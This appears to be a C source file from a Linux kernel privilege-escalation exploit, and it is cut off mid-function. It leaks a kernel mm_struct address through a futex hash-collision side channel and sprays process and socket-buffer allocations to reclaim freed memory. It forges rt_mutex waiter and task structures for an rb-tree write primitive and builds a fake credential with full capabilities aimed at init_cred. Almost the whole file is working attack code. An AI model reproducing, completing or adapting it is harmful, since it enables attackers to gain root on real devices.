#include "common.h"
#include "glk_session.h"
#include <assert.h>
#include "runtime_struct_offsets.h"
#include "kernelsnitch/kernelsnitch.h"


static long long ms_since(struct timespec *t0) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0->tv_sec) * 1000LL +
         (now.tv_nsec - t0->tv_nsec) / 1000000LL;
}


int tcp_route_selected(const struct kernel_offsets *t, int tcp_route) {
  return tcp_route && t && t->compact_waiter;
}

int kernel5_route_selected(const struct kernel_offsets *t) {
  return t && t->kernel_major == 5 && t->mcast_waiter_off > 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(Glk43499Session *s) {
  const struct kernel_offsets *t = &s->target.offsets;
  const Glk43499Layout *L = &s->target.layout;
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)s->target.layout.p0_phys_offset,
             (unsigned long long)s->target.layout.p0_kernel_phys_load,
             (unsigned long long)(s->target.layout.p0_kernel_phys_load -
                                  s->target.layout.p0_phys_offset),
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3;    /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
  attr.sched_nice = nice_value;
  errno = 0;
  long ret = syscall(274, tid, &attr, 0);
  if (ret != 0) {
    pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
  }
  return ret;
}

void init_p0_profile(Glk43499Target *target) {
  pr_info("p0 kernel_phys_load=%016zx delta=%016zx\n",
          (size_t)target->layout.p0_kernel_phys_load,
          (size_t)(target->layout.p0_kernel_phys_load -
                   target->layout.p0_phys_offset));
}

uintptr_t p0_data_alias(const Glk43499Target *target, uintptr_t image_addr) {
  uintptr_t off = image_addr - target->layout.kimage_text_base;
  uintptr_t phys = target->layout.p0_kernel_phys_load + off;
  return ((phys - target->layout.p0_phys_offset) |
          target->layout.p0_page_offset);
}

uintptr_t data_addr(const Glk43499Target *target, uintptr_t image_addr) {
  return p0_data_alias(target, image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static int fill_profile_cred_copy(const Glk43499Target *target,
                                  unsigned char *p, size_t off,
                                  size_t order3_size) {
  const struct kernel_offsets *t = &target->offsets;
  if (!t->cred_copy_size ||
      t->cred_copy_size > order3_size ||
      t->cred_usage_offset + sizeof(uint32_t) >
          t->cred_copy_size ||
      t->cred_caps_offset +
              t->cred_caps_count * sizeof(uint64_t) >
          t->cred_copy_size) {
    pr_error("credential copy profile is incomplete\n");
    return 0;
  }
  unsigned char *c = p + off;
  memset(c, 0, t->cred_copy_size);
  put32(c, t->cred_usage_offset,
        t->cred_usage_value);
  for (uint32_t i = 0; i < t->cred_caps_count; i++) {
    put64(c, t->cred_caps_offset + i * sizeof(uint64_t),
          t->cred_caps_value);
  }

  const uint32_t ref_offsets[] = {
      t->cred_ref0_offset, t->cred_ref1_offset,
      t->cred_ref2_offset, t->cred_ref3_offset,
  };
  const uint64_t ref_images[] = {
      t->cred_ref0_image, t->cred_ref1_image,
      t->cred_ref2_image, t->cred_ref3_image,
  };
  for (size_t i = 0; i < t->cred_ref_count; i++) {
    if (ref_offsets[i] + sizeof(uint64_t) > t->cred_copy_size) {
      pr_error("credential reference %zu exceeds configured copy size\n", i);
      return 0;
    }
    put64(c, ref_offsets[i], data_addr(target, ref_images[i]));
  }
  return 1;
}

pid_t clone_child(int core) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(core);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(rt->ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  for (int i = 0; i < 2; i++) {
    if (rt->reclaim_sv[i] >= 0) {
      close(rt->reclaim_sv[i]);
      rt->reclaim_sv[i] = -1;
    }
  }
}

int quarantine_reclaim_sockets(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  if (rt->quarantined_reclaim_sv[0] >= 0 || rt->quarantined_reclaim_sv[1] >= 0)
    return 0;
  if (rt->reclaim_sv[0] < 0 || rt->reclaim_sv[1] < 0)
    return 0;
  rt->quarantined_reclaim_sv[0] = rt->reclaim_sv[0];
  rt->quarantined_reclaim_sv[1] = rt->reclaim_sv[1];
  rt->reclaim_sv[0] = rt->reclaim_sv[1] = -1;
  return 1;
}

void release_quarantined_reclaim_sockets(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  for (int i = 0; i < 2; i++) {
    if (rt->quarantined_reclaim_sv[i] >= 0) {
      close(rt->quarantined_reclaim_sv[i]);
      rt->quarantined_reclaim_sv[i] = -1;
    }
  }
}

int stash_prebuilt_page(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  if (rt->prebuilt_reclaim_sv[0] >= 0 || rt->reclaim_sv[0] < 0)
    return 0;
  rt->prebuilt_reclaim_sv[0] = rt->reclaim_sv[0];
  rt->prebuilt_reclaim_sv[1] = rt->reclaim_sv[1];
  rt->reclaim_sv[0] = rt->reclaim_sv[1] = -1;
  rt->prebuilt_page_base = rt->page_base;
  rt->prebuilt_fake_lock = rt->fake_lock;
  rt->prebuilt_fake_w0 = rt->fake_w0;
  rt->prebuilt_fake_task = rt->fake_task;
  rt->prebuilt_fake_parent = rt->fake_parent;
  rt->prebuilt_fake_right = rt->fake_right;
  rt->prebuilt_fake_left = rt->fake_left;
  rt->prebuilt_fake_fops = rt->fake_fops;
  return 1;
}

int activate_prebuilt_page(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  if (rt->prebuilt_reclaim_sv[0] < 0)
    return 0;
  close_reclaim_sockets(s);
  rt->reclaim_sv[0] = rt->prebuilt_reclaim_sv[0];
  rt->reclaim_sv[1] = rt->prebuilt_reclaim_sv[1];
  rt->prebuilt_reclaim_sv[0] = rt->prebuilt_reclaim_sv[1] = -1;
  rt->page_base = rt->prebuilt_page_base;
  rt->fake_lock = rt->prebuilt_fake_lock;
  rt->fake_w0 = rt->prebuilt_fake_w0;
  rt->fake_task = rt->prebuilt_fake_task;
  rt->fake_parent = rt->prebuilt_fake_parent;
  rt->fake_right = rt->prebuilt_fake_right;
  rt->fake_left = rt->prebuilt_fake_left;
  rt->fake_fops = rt->prebuilt_fake_fops;
  return 1;
}

void discard_prebuilt_page(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  for (int i = 0; i < 2; i++) {
    if (rt->prebuilt_reclaim_sv[i] >= 0) {
      close(rt->prebuilt_reclaim_sv[i]);
      rt->prebuilt_reclaim_sv[i] = -1;
    }
  }
  rt->prebuilt_page_base = 0;
  rt->prebuilt_fake_lock = 0;
  rt->prebuilt_fake_w0 = 0;
  rt->prebuilt_fake_task = 0;
  rt->prebuilt_fake_parent = 0;
  rt->prebuilt_fake_right = 0;
  rt->prebuilt_fake_left = 0;
  rt->prebuilt_fake_fops = 0;
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] >= 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  close_ctx_memfds(&rt->prepare_ctx);
  close_ctx_memfds(&rt->spray_ctx);
  close_ctx_memfds(&rt->pre_ctx);
  close_ctx_memfds(&rt->post_ctx);
  if (rt->memfd_leak >= 0) {
    close(rt->memfd_leak);
    rt->memfd_leak = -1;
  }
  free_ctx_storage(&rt->prepare_ctx);
  free_ctx_storage(&rt->spray_ctx);
  free_ctx_storage(&rt->pre_ctx);
  free_ctx_storage(&rt->post_ctx);
  free(rt->skb_buf);
  rt->skb_buf = NULL;
}

static void alloc_ctx_memfds(struct mm_ctx *ctx) {
  ctx->memfds = calloc(sizeof(int), ctx->mm_cnt);
  for (size_t i = 0; i < ctx->mm_cnt; i++) ctx->memfds[i] = -1;
}

void prepare_ctxs(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  rt->prepare_ctx.mm_cnt = 8 * rt->mm_objs_per_slab;
  rt->prepare_ctx.childs = calloc(sizeof(pid_t), rt->prepare_ctx.mm_cnt);
  alloc_ctx_memfds(&rt->prepare_ctx);

  rt->spray_ctx.mm_cnt = (1 + s->config.mm_partials) * rt->mm_objs_per_slab;
  rt->spray_ctx.childs = calloc(sizeof(pid_t), rt->spray_ctx.mm_cnt);
  alloc_ctx_memfds(&rt->spray_ctx);

  rt->pre_ctx.mm_cnt = rt->mm_objs_per_slab - 1;
  rt->pre_ctx.childs = calloc(sizeof(pid_t), rt->pre_ctx.mm_cnt);
  alloc_ctx_memfds(&rt->pre_ctx);

  rt->post_ctx.mm_cnt = rt->mm_objs_per_slab;
  rt->post_ctx.childs = calloc(sizeof(pid_t), rt->post_ctx.mm_cnt);
  alloc_ctx_memfds(&rt->post_ctx);
}

struct payload_geometry {
  int tcp;
  int compact;
  int custom_write;
  int child_node;
  uintptr_t custom_target;
  uintptr_t base;
  uintptr_t payload_base;
  size_t chunk_bias;
  size_t fake_task_off;
};

static void payload_geometry(Glk43499Session *s, const GlkWriteRequest *req,
                             uintptr_t base, struct payload_geometry *g) {
  const struct kernel_offsets *t = &s->target.offsets;
  const Glk43499Layout *L = &s->target.layout;
  g->tcp = tcp_route_selected(&s->target.offsets, s->config.tcp_route);
  g->compact = t && t->compact_waiter;
  g->custom_write = (int)req->mode;
  g->child_node = req->preserve_child ? 1 : 0;
  g->custom_target = req->target;
  g->base = base;
  long long payload_delta = g->tcp ? 0 : L->skb_data_delta;
  g->chunk_bias = g->tcp ? L->skb_tcp_bias : (size_t)L->skb_frag_bias;
  g->fake_task_off = g->tcp ? L->tcp_fake_task_off : (size_t)L->fake_task_off;
  g->payload_base = base + payload_delta;
}

static void payload_init_fake(Glk43499Session *s, const struct payload_geometry *g) {
  Glk43499Runtime *rt = &s->rt;
  const Glk43499Layout *L = &s->target.layout;
  rt->fake_lock = g->payload_base + L->lock_off;
  rt->fake_w0 = g->payload_base + L->w0_off;
  rt->fake_task = g->payload_base + g->fake_task_off;
  rt->fake_fops = g->payload_base + L->fops_off;
  if (!g->custom_write) return;

  if (g->child_node) {
    if (g->custom_write == 2) {
      rt->fake_right = data_addr(&s->target, s->target.layout.init_cred_image);
    } else {
      /* The compact rb_erase primitive also writes dest-8 at child+8.
       * Keep that side effect in this payload's private scratch slot. */
      rt->fake_right = g->base + 0x100;
    }
  } else {
    rt->fake_right = 0;
  }
  rt->fake_left = 0;
  if (g->custom_write == 2) {
    rt->fake_fops =
        g->payload_base + (g->tcp ? L->tcp_cred_copy_off : L->cred_copy_off);
  }
  rt->fake_parent = g->custom_target - 8;
}

static void payload_write_waiter(Glk43499Session *s, unsigned char *p,
                                 const struct payload_geometry *g) {
  Glk43499Runtime *rt = &s->rt;
  const struct kernel_offsets *t = &s->target.offsets;
  const Glk43499Layout *L = &s->target.layout;
  uintptr_t write_pc = rt->fake_parent;
  uintptr_t write_right = rt->fake_right;
  uintptr_t write_left = rt->fake_left;
  uint64_t waiter_task = INIT_TASK;

  put32(p, L->lock_off + 0x00, 0);
  put64(p, L->lock_off + 0x08, rt->fake_w0);
  put64(p, L->lock_off + 0x10, rt->fake_w0);
  put64(p, L->lock_off + 0x18, rt->fake_task | 1);

  if (g->compact) {
    put64(p, L->w0_off + 0x00, 1);
    put64(p, L->w0_off + 0x08, 0);
    put64(p, L->w0_off + 0x10, 0);
    if (g->tcp && write_right) {
      put64(p, L->w0_off + 0x18, write_right);
      put64(p, L->w0_off + 0x20, 0);
      put64(p, L->w0_off + 0x28, g->custom_target);
    } else {
      put64(p, L->w0_off + 0x18, write_pc);
      put64(p, L->w0_off + 0x20, write_right);
      put64(p, L->w0_off + 0x28, write_left);
    }
    put64(p, L->w0_off + 0x30, waiter_task);
    put64(p, L->w0_off + 0x38, rt->fake_lock);
    put32(p, L->w0_off + 0x40, 0);
    put32(p, L->w0_off + 0x44, L->fake_waiter_prio);
    put64(p, L->w0_off + 0x48, 0);
    put64(p, L->w0_off + 0x50, 0);
  } else {
    put64(p, L->w0_off + 0x00, 1);
    put64(p, L->w0_off + 0x08, 0);
    put64(p, L->w0_off + 0x10, 0);
    put32(p, L->w0_off + L->fake_waiter_tree_prio_off, L->fake_waiter_prio);
    put64(p, L->w0_off + L->fake_waiter_tree_deadline_off, 0);
    put64(p, L->w0_off + L->fake_waiter_pi_tree_entry_off + 0x00, write_pc);
    put64(p, L->w0_off + L->fake_waiter_pi_tree_entry_off + 0x08, write_right);
    put64(p, L->w0_off + L->fake_waiter_pi_tree_entry_off + 0x10, write_left);
    put32(p, L->w0_off + L->fake_waiter_pi_tree_prio_off, L->fake_waiter_prio);
    put64(p, L->w0_off + L->fake_waiter_pi_tree_deadline_off, 0);
    put64(p, L->w0_off + L->fake_waiter_task_off, waiter_task);
    put64(p, L->w0_off + L->fake_waiter_lock_off, rt->fake_lock);
    put32(p, L->w0_off + L->fake_waiter_wake_state_off, 0);
    put64(p, L->w0_off + L->fake_waiter_ww_ctx_off, 0);
  }
  (void)t;
}

/** @brief Write the fake task's rb links. */
static void payload_write_task_links(Glk43499Session *s, unsigned char *p) {
  Glk43499Runtime *rt = &s->rt;
  const Glk43499Layout *L = &s->target.layout;
  put64(p, L->right_off + 0x00, rt->fake_parent);
  put64(p, L->right_off + 0x08, 0);
  put64(p, L->right_off + 0x10, 0);
  put64(p, L->left_off + 0x00, rt->fake_parent);
  put64(p, L->left_off + 0x08, 0);
  put64(p, L->left_off + 0x10, 0);
}

/** @brief Copy the profile credential image into the payload when requested. */
static int payload_write_task_cred(Glk43499Session *s, unsigned char *p,
                                   const struct payload_geometry *g) {
  const Glk43499Layout *L = &s->target.layout;
  size_t order3 = glk43499_order3_size(L->page_size, s->config.mm_order);
  if (g->custom_write >= 2 &&
      !fill_profile_cred_copy(&s->target, p,
                              g->tcp ? L->tcp_cred_copy_off : L->cred_copy_off,
                              order3)) {
    return 0;
  }
  return 1;
}

static int payload_write_task(Glk43499Session *s, unsigned char *p,
                              const struct payload_geometry *g) {
  Glk43499Runtime *rt = &s->rt;
  const struct kernel_offsets *t = &s->target.offsets;
  const Glk43499Layout *L = &s->target.layout;
  uint64_t task_group = ROOT_TASK_GROUP;
  uint64_t pi_top_task = INIT_TASK;

  uint32_t ft_prio_off = g->compact ? t->task_prio : L->fake_task_prio_off;
  uint32_t ft_nprio_off = g->compact ? t->task_normal_prio : L->fake_task_normal_prio_off;
  uint32_t ft_tg_off = g->compact ? t->task_sched_task_group : L->fake_task_task_group_off;
  uint32_t ft_pi_lock_off = g->compact ? t->task_pi_lock : L->fake_task_pi_lock_off;
  uint32_t ft_pi_wait_off = g->compact ? t->task_pi_waiters : L->fake_task_pi_waiters_off;
  uint32_t ft_pi_top_off = g->compact ? t->task_pi_top_task : L->fake_task_pi_top_task_off;
  uint32_t ft_pi_blocked_off = g->compact ? t->task_pi_blocked_on : L->fake_task_pi_blocked_on_off;

  put32(p, g->fake_task_off + L->fake_task_usage_off, 0x100);
  put32(p, g->fake_task_off + ft_prio_off, L->fake_task_prio);
  put32(p, g->fake_task_off + ft_nprio_off, L->fake_task_prio);
  put32(p, g->fake_task_off + ft_pi_lock_off, 0);
  put64(p, g->fake_task_off + ft_pi_wait_off, 0);
  put64(p, g->fake_task_off + ft_pi_wait_off + 0x08, 0);
  put64(p, g->fake_task_off + ft_tg_off, task_group);
  put64(p, g->fake_task_off + ft_pi_top_off, pi_top_task);
  put64(p, g->fake_task_off + ft_pi_blocked_off, 0);

  payload_write_task_links(s, p);
  return payload_write_task_cred(s, p, g);
}

int prepare_skb_payload(Glk43499Session *s, const GlkWriteRequest *req,
                        uintptr_t base) {
  Glk43499Runtime *rt = &s->rt;
  const Glk43499Layout *L = &s->target.layout;
  size_t order3 = glk43499_order3_size(L->page_size, s->config.mm_order);
  size_t skb_size = order3 * 2;
  memset(rt->skb_buf, 0, skb_size);

  struct payload_geometry g;
  payload_geometry(s, req, base, &g);
  payload_init_fake(s, &g);

  for (size_t chunk = 0; chunk < skb_size; chunk += order3) {
    unsigned char *p = rt->skb_buf + chunk + g.chunk_bias;
    payload_write_waiter(s, p, &g);
    if (!payload_write_task(s, p, &g)) return 0;
  }
  return 1;
}

/** @brief Allocate the SKB buffer and per-slab context counts. */
static int prepare_alloc_skb(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  const struct kernel_offsets *t = &s->target.offsets;
  size_t order3 = glk43499_order3_size(s->target.layout.page_size,
                                       s->config.mm_order);
  size_t skb_size = order3 * 2;
  assert(skb_size == order3 * 2);
  rt->mm_objs_per_slab = order3 / mm_struct_sz();
  if (rt->mm_objs_per_slab == 0) return -1;
  prepare_ctxs(s);
  rt->skb_buf = malloc(skb_size);
  memset(rt->skb_buf, 0x41, skb_size);
  return 0;
}

static int prepare_reset(Glk43499Session *s) {
  close_reclaim_sockets(s);
  cleanup_page_prepare_state(s);
  return prepare_alloc_skb(s);
}

/** @brief Clone the prepare/spray children and open their memfds. */
static void prepare_spawn_spray(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  for (size_t i = 0; i < rt->prepare_ctx.mm_cnt; i++) {
    rt->prepare_ctx.childs[i] = clone_child(s->config.main_cpu);
    rt->prepare_ctx.memfds[i] = open_memfd(rt->prepare_ctx.childs[i]);
  }
  for (size_t i = 0; i < rt->spray_ctx.mm_cnt; i++) {
    rt->spray_ctx.childs[i] = clone_child(s->config.main_cpu);
    rt->spray_ctx.memfds[i] = open_memfd(rt->spray_ctx.childs[i]);
  }
}

/** @brief Start KernelSnitch for the spray contexts. */
static int prepare_start_kernelsnitch(Glk43499Session *s, int cpu_count) {
  Glk43499Runtime *rt = &s->rt;
  const struct kernel_offsets *t = &s->target.offsets;
  rt->ks = kernelsnitch_setup(
      mm_struct_sz(), s->config.mm_order, cpu_count,
      kernelsnitch_collisions(), 0, CORE(s));
  return rt->ks ? 0 : -1;
}

static int prepare_spray_contexts(Glk43499Session *s,
                                  struct timespec *t0) {
  Glk43499Runtime *rt = &s->rt;
  prepare_spawn_spray(s);

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  if (prepare_start_kernelsnitch(s, cpu_count) != 0) {
    for (size_t i = 0; i < rt->spray_ctx.mm_cnt; i++) {
      kill_child(rt->spray_ctx.childs[i]);
      rt->spray_ctx.childs[i] = 0;
    }
    return -1;
  }
  pr_verbose("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
          cpu_count, ms_since(t0));
  return 0;
}

/** @brief Clone pre/leak/post children used by the mm leak. */
static void prepare_spawn_leak(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  for (size_t i = 0; i < rt->pre_ctx.mm_cnt; i++) {
    rt->pre_ctx.childs[i] = clone_child(s->config.main_cpu);
  }
  rt->child_leak = clone_leak_child(s);
  for (size_t i = 0; i < rt->post_ctx.mm_cnt; i++) {
    rt->post_ctx.childs[i] = clone_child(s->config.main_cpu);
  }
}

/** @brief Open the memfds that keep the leak children alive. */
static void prepare_open_leak_fds(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  for (size_t i = 0; i < rt->pre_ctx.mm_cnt; i++) {
    rt->pre_ctx.memfds[i] = open_memfd(rt->pre_ctx.childs[i]);
  }
  rt->memfd_leak = open_memfd(rt->child_leak);
  for (size_t i = 0; i < rt->post_ctx.mm_cnt; i++) {
    rt->post_ctx.memfds[i] = open_memfd(rt->post_ctx.childs[i]);
  }
}

/** @brief Release the helper children after their memfds are open. */
static void prepare_kill_leak_children(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  for (size_t i = 0; i < rt->pre_ctx.mm_cnt; i++) {
    kill_child(rt->pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < rt->post_ctx.mm_cnt; i++) {
    kill_child(rt->post_ctx.childs[i]);
  }
  for (size_t i = 0; i < rt->spray_ctx.mm_cnt; i++) {
    kill_child(rt->spray_ctx.childs[i]);
  }
}

static void prepare_leak_children(Glk43499Session *s) {
  prepare_spawn_leak(s);
  prepare_open_leak_fds(s);
  prepare_kill_leak_children(s);
}

/** @brief Emit the periodic collision-scan heartbeat. */
static void prepare_scan_beat(Glk43499Runtime *rt, long long waited) {
  size_t scan_done = rt->ks->scan_done;
  size_t scan_total = rt->ks->total_futexes;
  if (scan_done > scan_total) scan_done = scan_total;
  size_t scan_id = (scan_done * 4096) | ((scan_done * 8) % 4096);
  if (scan_id > (size_t)FUTEX_SZ) scan_id = (size_t)FUTEX_SZ;
  pr_verbose("[spray]   still finding collisions (%llds) %zu%% "
             "(futex 0x%zx/0x%zx)...\n",
             waited / 1000,
             scan_total ? scan_done * 100 / scan_total : 0,
             scan_id, (size_t)FUTEX_SZ);
}

/** @brief Wait for the leak child, with timeout and scan heartbeat. */
static int prepare_wait_leak_child(Glk43499Session *s, struct timespec *t0,
                                   int *leak_status) {
  Glk43499Runtime *rt = &s->rt;
  pr_verbose("[spray] finding futex collisions... +%lldms\n", ms_since(t0));
  struct timespec t_wait;
  clock_gettime(CLOCK_MONOTONIC, &t_wait);
  *leak_status = 0;
  pid_t wp = 0;
  long long last_beat = 0;
  for (;;) {
    wp = waitpid(rt->child_leak, leak_status, WNOHANG);
    if (wp == rt->child_leak || wp < 0) break;
    long long waited = ms_since(&t_wait);
    if (waited >= 60000) {
      pr_warning("leak child stuck >60s, killing it\n");
      kill(rt->child_leak, SIGKILL);
      waitpid(rt->child_leak, NULL, 0);
      break;
    }
    if (waited - last_beat >= 2000) {
      prepare_scan_beat(rt, waited);
      last_beat = waited;
    }
    usleep(s->config.w3_settle_us);
  }
  if (wp < 0) pr_warning("waitpid leak child: %m\n");
  return wp == rt->child_leak;
}

static int prepare_wait_collisions(Glk43499Session *s, struct timespec *t0) {
  Glk43499Runtime *rt = &s->rt;
  int leak_status = 0;
  int exited = prepare_wait_leak_child(s, t0, &leak_status);
  if (exited &&
      (!WIFEXITED(leak_status) || WEXITSTATUS(leak_status) != 0)) {
    pr_warning("leak child exit status=%d\n", leak_status);
  }
  if (!kernelsnitch_found_collisions(rt->ks)) {
    pr_warning("[spray] futex collisions not found\n");
    return 0;
  }
  pr_verbose("[spray] futex collisions found +%lldms\n", ms_since(t0));
  return 1;
}

static uintptr_t prepare_leak_mm(Glk43499Session *s, struct timespec *t0) {
  Glk43499Runtime *rt = &s->rt;
  kernelsnitch_bruteforce(rt->ks);
  pr_verbose("[spray] mm_struct leaked=0x%zx +%lldms\n",
          (size_t)rt->ks->mm_struct, ms_since(t0));
  uintptr_t leaked = rt->ks->mm_struct;
  leaked |= (uintptr_t)0xf << 56;
  rt->last_mm_struct = leaked;
  if (leaked == (uintptr_t)-1 ||
      leaked < s->target.layout.kernelsnitch_identity_start ||
      leaked >= s->target.layout.direct_map_end) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    return 0;
  }
  return leaked;
}

/** @brief Close the pre/post/spray memfds that shaped the slab. */
static void prepare_close_pre_memfds(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  for (size_t i = 0; i < rt->pre_ctx.mm_cnt; i++) {
    SYSCHK(close(rt->pre_ctx.memfds[i]));
    rt->pre_ctx.memfds[i] = -1;
  }
  if (rt->post_ctx.mm_cnt > 0) {
    for (size_t i = 0; i < rt->post_ctx.mm_cnt - 1; i++) {
      SYSCHK(close(rt->post_ctx.memfds[i]));
      rt->post_ctx.memfds[i] = -1;
    }
  }
  if (rt->mm_objs_per_slab > 0) {
    for (size_t i = 0; i < rt->spray_ctx.mm_cnt; i += rt->mm_objs_per_slab) {
      SYSCHK(close(rt->spray_ctx.memfds[i]));
      rt->spray_ctx.memfds[i] = -1;
    }
  }
}

/** @brief Drain the prepared SKB into the reclaim socket. */
static void prepare_reclaim_send(Glk43499Session *s, const struct msghdr *msg) {
  Glk43499Runtime *rt = &s->rt;
  for (uint32_t i = 0; i < s->config.skb_reclaim_sends; i++) {
    errno = 0;
    ssize_t sent = sendmsg(rt->reclaim_sv[0], msg, MSG_DONTWAIT);
    if (sent <= 0) break;
  }
}

/** @brief Open the reclaim/pcp sockets and build the shaping message. */
static void prepare_payload_reclaim(Glk43499Session *s, int pcp_shaping_sv[2],
                                    struct iovec *iov, struct msghdr *msg) {
  Glk43499Runtime *rt = &s->rt;
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, rt->reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(rt->reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(rt->reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(rt->reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  memset(iov, 0, sizeof(*iov));
  iov->iov_base = rt->skb_buf;
  iov->iov_len = glk43499_order3_size(s->target.layout.page_size,
                                      s->config.mm_order) * 2;

  memset(msg, 0, sizeof(*msg));
  msg->msg_iov = iov;
  msg->msg_iovlen = 1;
  SYSCHK(sendmsg(pcp_shaping_sv[0], msg, 0));
}

/** @brief Close the prepare children after the payload is staged. */
static void prepare_payload_cleanup(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  for (size_t i = 0; i < rt->prepare_ctx.mm_cnt; i++) {
    SYSCHK(close(rt->prepare_ctx.memfds[i]));
    rt->prepare_ctx.memfds[i] = -1;
    kill_child(rt->prepare_ctx.childs[i]);
  }
}

static uintptr_t prepare_payload(Glk43499Session *s, const GlkWriteRequest *req,
                                 uintptr_t base, struct timespec *t0) {
  Glk43499Runtime *rt = &s->rt;
  if (!prepare_skb_payload(s, req, base)) return 0;

  int pcp_shaping_sv[2];
  struct iovec iov;
  struct msghdr msg;
  prepare_payload_reclaim(s, pcp_shaping_sv, &iov, &msg);

  pin_to_core(CORE(s));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
